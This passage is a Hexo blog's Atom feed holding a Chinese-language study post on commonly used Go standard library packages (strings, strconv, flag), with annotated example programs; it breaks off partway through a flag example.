<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Frdqy的博客</title>
  
  <subtitle>记录默默到无闻的学习路</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-12-03T15:17:03.414Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Frdqy</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Go常用库</title>
    <link href="http://yoursite.com/2020/11/14/Go%E5%B8%B8%E7%94%A8%E5%BA%93/"/>
    <id>http://yoursite.com/2020/11/14/Go%E5%B8%B8%E7%94%A8%E5%BA%93/</id>
    <published>2020-11-14T06:07:13.000Z</published>
    <updated>2020-12-03T15:17:03.414Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>主要记录学习遇到的库，以及基本用法，后续会不断更新与完善，以便查阅。</p><a id="more"></a><h3 id="strings"><a href="#strings" class="headerlink" title="strings"></a>strings</h3><p>字符串常用库函数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">   <span class="string">"fmt"</span></span><br><span class="line">   <span class="string">"strings"</span></span><br><span class="line">   <span class="string">"unicode"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Compare-&gt; a&gt;b:1 a=b:0 a&lt;b:-1</span></span><br><span class="line"><span class="comment">// EqualFold-&gt; 忽略大小写比较大小</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">stringCompare</span><span class="params">(a,b <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">   <span class="comment">// compare</span></span><br><span class="line">   a = <span class="string">"gopher"</span></span><br><span class="line">   b = <span class="string">"hello world"</span></span><br><span class="line">   fmt.Println(strings.Compare(a, b))</span><br><span class="line">   fmt.Println(strings.Compare(a, a))</span><br><span class="line">   fmt.Println(strings.Compare(b, a))</span><br><span class="line"></span><br><span class="line">   fmt.Println(strings.EqualFold(<span class="string">"GO"</span>, <span class="string">"go"</span>))</span><br><span class="line">   fmt.Println(strings.EqualFold(<span class="string">"壹"</span>, <span class="string">"一"</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Contains(s,substr)-&gt; substr是否在s中</span></span><br><span class="line"><span class="comment">// ContainsAny(s,chars)-&gt; chars中任何一个字符在s中有则true</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">stringSubstr</span><span class="params">()</span></span> &#123;</span><br><span class="line">   fmt.Println(strings.Contains(<span class="string">"team"</span>, <span class="string">"i"</span>))</span><br><span class="line">   fmt.Println(strings.ContainsAny(<span class="string">"team"</span>, <span class="string">"i"</span>))</span><br><span class="line">   fmt.Println(strings.ContainsAny(<span class="string">"failure"</span>, <span class="string">"u &amp; i"</span>))</span><br><span class="line">   fmt.Println(strings.ContainsAny(<span class="string">"in failure"</span>, <span class="string">"s g"</span>))</span><br><span class="line">   fmt.Println(strings.ContainsAny(<span class="string">"foo"</span>, <span class="string">""</span>))</span><br><span class="line">   fmt.Println(strings.ContainsAny(<span class="string">""</span>, <span class="string">""</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Count(s,sep string)</span></span><br><span class="line"><span class="comment">// 当sep为空时，返回utf8.RuneCountInString(s) + 1</span></span><br><span class="line"><span class="comment">// 计算sep在s中无重复的次数</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">stringCount</span><span class="params">()</span></span> &#123;</span><br><span class="line">   fmt.Println(strings.Count(<span class="string">"cheese"</span>, <span class="string">"e"</span>))</span><br><span class="line">   fmt.Println(<span class="built_in">len</span>(<span class="string">"谷歌中国"</span>))</span><br><span class="line">   fmt.Println(strings.Count(<span class="string">"谷歌中国"</span>, <span class="string">""</span>))</span><br><span class="line">   fmt.Println(strings.Count(<span class="string">"fivevev"</span>, <span class="string">"vev"</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Field用一个或多个空格(unicode.isSpace)分割字符串(string-&gt;slice)</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">stringFields</span><span class="params">()</span></span> &#123;</span><br><span class="line">   fmt.Printf(<span class="string">"Fields are: %q\n"</span>,strings.Fields(<span class="string">"   foo bar   baz   "</span>))</span><br><span class="line">   fmt.Println(strings.FieldsFunc(<span class="string">"  foo bar  baz   "</span>, unicode.IsSpace))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 前两个等价</span></span><br><span class="line"><span class="comment">// SplitAfter会保存sep，而Split不会保存</span></span><br><span class="line"><span class="comment">// SplitN 最后一个参数控制返回slice的元素个数，若&lt;0则返回全部。&gt;0时最后一个元素不会被分割</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">stringSplit</span><span class="params">()</span></span> &#123;</span><br><span class="line">   fmt.Printf(<span class="string">"%q\n"</span>, strings.SplitN(<span class="string">"foo,bar,baz"</span>, <span class="string">","</span>,<span class="number">-1</span>))</span><br><span class="line">   fmt.Printf(<span class="string">"%q\n"</span>, strings.Split(<span class="string">"foo,bar,baz"</span>, <span class="string">","</span>))</span><br><span class="line">   fmt.Printf(<span class="string">"%q\n"</span>, strings.SplitAfter(<span class="string">"foo,bar,baz"</span>, <span class="string">","</span>))</span><br><span class="line">   fmt.Printf(<span class="string">"%q\n"</span>, strings.SplitN(<span class="string">"foo,bar,baz"</span>, <span class="string">","</span>, <span class="number">2</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// HasPrefix判断是否包含前缀</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">stringPrefix</span><span class="params">()</span></span> &#123;</span><br><span class="line">   fmt.Println(strings.HasPrefix(<span class="string">"Gopher"</span>, <span class="string">"Go"</span>))</span><br><span class="line">   fmt.Println(strings.HasPrefix(<span class="string">"Gopher"</span>, <span class="string">"C"</span>))</span><br><span class="line">   fmt.Println(strings.HasPrefix(<span class="string">"Gopher"</span>, <span class="string">""</span>))</span><br><span class="line">   fmt.Println(strings.HasSuffix(<span class="string">"Amigo"</span>, <span class="string">"go"</span>))</span><br><span class="line">   fmt.Println(strings.HasSuffix(<span class="string">"Amigo"</span>, <span class="string">"Ami"</span>))</span><br><span class="line">   fmt.Println(strings.HasSuffix(<span class="string">"Amigo"</span>, <span class="string">""</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 连接字符串(slice-&gt;string)</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">stringJoin</span><span class="params">()</span></span> &#123;</span><br><span class="line">   fmt.Println(strings.Join([]<span class="keyword">string</span>&#123;<span class="string">"name=xxx"</span>, <span class="string">"age=xx"</span>&#125;, <span class="string">"&amp;"</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 重复字符串</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">stringRepeat</span><span class="params">()</span></span> &#123;</span><br><span class="line">   fmt.Println(<span class="string">"ba"</span>+strings.Repeat(<span class="string">"na"</span>,<span class="number">2</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 字符替换</span></span><br><span class="line"><span class="comment">// 每个字符做map函数替换，mapping函数可自行编写</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">stringMap</span><span class="params">()</span></span> &#123;</span><br><span class="line">   mapping := <span class="function"><span class="keyword">func</span><span class="params">(r <span class="keyword">rune</span>)</span> <span class="title">rune</span></span> &#123;</span><br><span class="line">      <span class="keyword">switch</span> &#123;</span><br><span class="line">      <span class="keyword">case</span> r &gt;= <span class="string">'A'</span> &amp;&amp; r &lt;= <span class="string">'Z'</span>: <span class="comment">// 大写字母转小写</span></span><br><span class="line">         <span class="keyword">return</span> r + <span class="number">32</span></span><br><span class="line">      <span class="keyword">case</span> r &gt;= <span class="string">'a'</span> &amp;&amp; r &lt;= <span class="string">'z'</span>: <span class="comment">// 小写字母不处理</span></span><br><span class="line">         <span class="keyword">return</span> r</span><br><span class="line">      <span class="keyword">case</span> unicode.Is(unicode.Han, r): <span class="comment">// 汉字换行</span></span><br><span class="line">         <span class="keyword">return</span> <span class="string">'\n'</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span> <span class="comment">// 过滤所有非字母、汉字的字符</span></span><br><span class="line">   &#125;</span><br><span class="line">   fmt.Println(strings.Map(mapping, <span class="string">"Hello你#￥%……\n（'World\n,好Hello^(&amp;(*界gopher..."</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 字符串替换</span></span><br><span class="line"><span class="comment">// n表示替换次数</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">stringReplace</span><span class="params">()</span></span> &#123;</span><br><span class="line">   fmt.Println(strings.Replace(<span class="string">"oink oink oink"</span>, <span class="string">"k"</span>, <span class="string">"ky"</span>, <span class="number">2</span>))</span><br><span class="line">   fmt.Println(strings.Replace(<span class="string">"oink oink oink"</span>, <span class="string">"oink"</span>, <span class="string">"moo"</span>, <span class="number">-1</span>))</span><br><span class="line">   fmt.Println(strings.ReplaceAll(<span class="string">"oink oink oink"</span>, <span class="string">"oink"</span>, <span class="string">"moo"</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 大小写转换</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">stringTo</span><span class="params">()</span></span> &#123;</span><br><span class="line">   fmt.Println(strings.ToLower(<span class="string">"HELLO WORLD"</span>))</span><br><span class="line">   fmt.Println(strings.ToLower(<span class="string">"Ā Á Ǎ À"</span>))</span><br><span class="line">   fmt.Println(strings.ToLowerSpecial(unicode.TurkishCase, <span class="string">"壹"</span>))</span><br><span class="line">   fmt.Println(strings.ToLowerSpecial(unicode.TurkishCase, <span class="string">"HELLO WORLD"</span>))</span><br><span class="line">   fmt.Println(strings.ToLower(<span class="string">"Önnek İş"</span>))</span><br><span class="line">   fmt.Println(strings.ToLowerSpecial(unicode.TurkishCase, <span class="string">"Önnek İş"</span>))</span><br><span class="line"></span><br><span class="line">   fmt.Println(strings.ToUpper(<span class="string">"hello world"</span>))</span><br><span class="line">   fmt.Println(strings.ToUpper(<span class="string">"ā á ǎ à"</span>))</span><br><span class="line">   fmt.Println(strings.ToUpperSpecial(unicode.TurkishCase, <span class="string">"一"</span>))</span><br><span class="line">   fmt.Println(strings.ToUpperSpecial(unicode.TurkishCase, <span class="string">"hello world"</span>))</span><br><span class="line">   fmt.Println(strings.ToUpper(<span class="string">"örnek iş"</span>))</span><br><span class="line">   fmt.Println(strings.ToUpperSpecial(unicode.TurkishCase, <span class="string">"örnek iş"</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 标题</span></span><br><span class="line"><span class="comment">// special用于将特殊字符转换为对应的大小写</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">stringTitle</span><span class="params">()</span></span> &#123;</span><br><span class="line">   fmt.Println(strings.Title(<span class="string">"hElLo wOrLd"</span>))</span><br><span class="line">   fmt.Println(strings.ToTitle(<span class="string">"hElLo wOrLd"</span>))</span><br><span class="line">   fmt.Println(strings.ToTitleSpecial(unicode.TurkishCase, <span class="string">"hElLo wOrLd"</span>))</span><br><span class="line">   fmt.Println(strings.Title(<span class="string">"āáǎà ōóǒò êēéěè"</span>))</span><br><span class="line">   fmt.Println(strings.ToTitle(<span class="string">"āáǎà ōóǒò êēéěè"</span>))</span><br><span class="line">   fmt.Println(strings.ToTitleSpecial(unicode.TurkishCase, <span class="string">"āáǎà ōóǒò êēéěè"</span>))</span><br><span class="line">   fmt.Println(strings.Title(<span class="string">"dünyanın ilk borsa yapısı Aizonai kabul edilir"</span>))</span><br><span class="line">   fmt.Println(strings.ToTitle(<span class="string">"dünyanın ilk borsa yapısı Aizonai kabul edilir"</span>))</span><br><span class="line">   fmt.Println(strings.ToTitleSpecial(unicode.TurkishCase, <span class="string">"dünyanın ilk borsa yapısı Aizonai kabul edilir"</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 修剪</span></span><br><span class="line"><span class="comment">// Trim匹配左右两侧，其余分左右</span></span><br><span class="line"><span class="comment">// TrimSpace匹配左右空格</span></span><br><span class="line"><span class="comment">// TrimPrefix匹配匹配前缀，Suffix为后缀</span></span><br><span class="line"><span class="comment">// TrimFunc将前后字符按指定函数处理</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">stringTrim</span><span class="params">()</span></span> &#123;</span><br><span class="line">   x := <span class="string">"!!!@@@你好,!@#$ Gophers###$$$"</span></span><br><span class="line">   fmt.Println(strings.Trim(x, <span class="string">"@#$!%^&amp;*()_+=-"</span>))</span><br><span class="line">   fmt.Println(strings.TrimLeft(x, <span class="string">"@#$!%^&amp;*()_+=-"</span>))</span><br><span class="line">   fmt.Println(strings.TrimRight(x, <span class="string">"@#$!%^&amp;*()_+=-"</span>))</span><br><span class="line">   fmt.Println(strings.TrimSpace(<span class="string">" \t\n Hello, Gophers \n\t\r\n"</span>))</span><br><span class="line">   fmt.Println(strings.TrimPrefix(x, <span class="string">"!"</span>))</span><br><span class="line">   fmt.Println(strings.TrimSuffix(x, <span class="string">"$"</span>))</span><br><span class="line"></span><br><span class="line">   f := <span class="function"><span class="keyword">func</span><span class="params">(r <span class="keyword">rune</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">      <span class="keyword">return</span> !unicode.Is(unicode.Han, r) <span class="comment">// 非汉字返回 true</span></span><br><span class="line">   &#125;</span><br><span class="line">   fmt.Println(strings.TrimFunc(x, f))</span><br><span class="line">   fmt.Println(strings.TrimLeftFunc(x, f))</span><br><span class="line">   fmt.Println(strings.TrimRightFunc(x, f))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// string内存中构建读写对象</span></span><br><span class="line"><span class="comment">// 读：reader</span></span><br><span class="line"><span class="comment">// 写：writer</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">stringobject</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// 字符串对象reader</span></span><br><span class="line">reader := strings.NewReader(<span class="string">"123abc"</span>)</span><br><span class="line"><span class="comment">// len表示还未读的长度，size表示字符串对象总长度</span></span><br><span class="line">fmt.Println(reader.Len(), reader.Size())</span><br><span class="line"><span class="comment">// read</span></span><br><span class="line">ctx := <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="number">5</span>)</span><br><span class="line">n, _ := reader.Read(ctx)</span><br><span class="line">fmt.Println(n, <span class="keyword">string</span>(ctx[:n]))</span><br><span class="line"><span class="comment">// seek重置</span></span><br><span class="line">reader.Seek(<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">n, _ = reader.Read(ctx)</span><br><span class="line">fmt.Println(n, <span class="keyword">string</span>(ctx[:n]))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 字符串对象builder</span></span><br><span class="line"><span class="keyword">var</span> writer strings.Builder</span><br><span class="line">writer.Write([]<span class="keyword">byte</span>(<span class="string">"abc123"</span>))</span><br><span class="line">fmt.Println(writer.Len())</span><br><span class="line">writer.WriteString(<span class="string">"xyz"</span>)</span><br><span class="line">fmt.Println(writer.String())</span><br><span class="line">fmt.Println(writer.Len())</span><br><span class="line">writer.Reset()</span><br><span class="line">fmt.Println(writer.String())</span><br><span class="line">fmt.Println(writer.Len())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="strconv"><a href="#strconv" class="headerlink" title="strconv"></a>strconv</h3><p>字符串和基础类型的转换（bool、int、float等）</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">   <span class="string">"fmt"</span></span><br><span class="line">   <span class="string">"strconv"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// ParseInt(s string, base int, bitSize int)(i int64, err error) 转换为有符号整形</span></span><br><span class="line"><span class="comment">// ParseUint(s string, base int, bitSize int) (n uint64, err error) 转换为 64 分别代表 int、int8、int16、int32 和 int64。</span></span><br><span class="line"><span class="comment">// Atoi(s string) (i int, err error) 内部调用ParseInt(s,10,0)实现，bitSize为0会判断32bit还是64bit</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">string2int</span><span class="params">()</span></span> &#123;</span><br><span class="line">   <span class="comment">// 超过8bit表示范围会报错(errRange)，仍会返回最大或最小值，此处为最大值</span></span><br><span class="line">   n, err := strconv.ParseInt(<span class="string">"128"</span>, <span class="number">10</span>, <span class="number">8</span>)</span><br><span class="line">   fmt.Println(n,err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// FormatUint(i uint64, base int) string 无符号整型转字符串</span></span><br><span class="line"><span class="comment">// FormatInt(i int64, base int) string 有符号整型转字符串</span></span><br><span class="line"><span class="comment">// Itoa(i int) string 内部调用FormatInt(i,10)实现</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">int2string</span><span class="params">()</span></span>  &#123;</span><br><span class="line">   <span class="keyword">const</span> digits = <span class="string">"0123456789abcdefghijklmnopqrstuvwxyz"</span></span><br><span class="line">   fmt.Println(strconv.FormatInt(<span class="number">12222</span>,<span class="number">10</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// format: bool/int/float -&gt; string</span></span><br><span class="line"><span class="comment">// parse: string -&gt; int/bool/float</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Quote字符串字面量</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">stringQuote</span><span class="params">()</span></span> &#123;</span><br><span class="line">   fmt.Println(<span class="string">"This is"</span>,strconv.Quote(<span class="string">"studygolang.com"</span>),<span class="string">"website"</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   stringQuote()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><p>解析命令行</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">   <span class="string">"flag"</span></span><br><span class="line">   <span class="string">"fmt"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">   intFlag <span class="keyword">int</span></span><br><span class="line">   boolFlag <span class="keyword">bool</span></span><br><span class="line">   stringFlag <span class="keyword">string</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">   flag.IntVar(&amp;intFlag,<span class="string">"intFlag"</span>,<span class="number">0</span>,<span class="string">"int flag value"</span>)</span><br><span class="line">   flag.BoolVar(&amp;boolFlag,<span class="string">"boolFlag"</span>,<span class="literal">false</span>,<span class="string">"bool flag value"</span>)</span><br><span class="line">   flag.StringVar(&amp;stringFlag,<span class="string">"stringFlag"</span>,<span class="string">""</span>,<span class="string">"string flag value"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   flag.Parse()</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 没有解析的flag保存于Arg中</span></span><br><span class="line">   fmt.Println(flag.Args())</span><br><span class="line">   fmt.Println(<span class="string">"Non-Flag Argument Count:"</span>,flag.NArg())</span><br><span class="line">   <span class="keyword">for</span> i:=<span class="number">0</span>;i&lt;flag.NArg();i++&#123;</span><br><span class="line">      fmt.Printf(<span class="string">"Argument %d: %s\n"</span>,i,flag.Arg(i))</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   fmt.Println(<span class="string">"Flag Count:"</span>,flag.NFlag())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">   <span class="string">"flag"</span></span><br><span class="line">   <span class="string">"fmt"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> logLevel <span class="keyword">string</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">   <span class="keyword">const</span> (</span><br><span class="line">      defaultLogLevel = <span class="string">"DEBUG"</span></span><br><span class="line">      usage = <span class="string">"set log level value"</span></span><br><span class="line">   )</span><br><span class="line"></span><br><span class="line">   flag.StringVar(&amp;logLevel,<span class="string">"log_type"</span>,defaultLogLevel,usage)</span><br><span class="line">   flag.StringVar(&amp;logLevel,<span class="string">"l"</span>,defaultLogLevel,usage+<span class="string">"(shorthand"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   flag.Parse()</span><br><span class="line"></span><br><span class="line">   fmt.Println(<span class="string">"log level"</span>,logLevel)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">   <span class="string">"flag"</span></span><br><span class="line">   <span class="string">"fmt"</span></span><br><span class="line">   <span class="string">"time"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">   period time.Duration</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">   flag.DurationVar(&amp;period,<span class="string">"period"</span>,<span class="number">1</span>*time.Second,<span class="string">"sleep period"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   flag.Parse()</span><br><span class="line">   fmt.Printf(<span class="string">"sleep for %v"</span>,period)</span><br><span class="line">   time.Sleep(period)</span><br><span 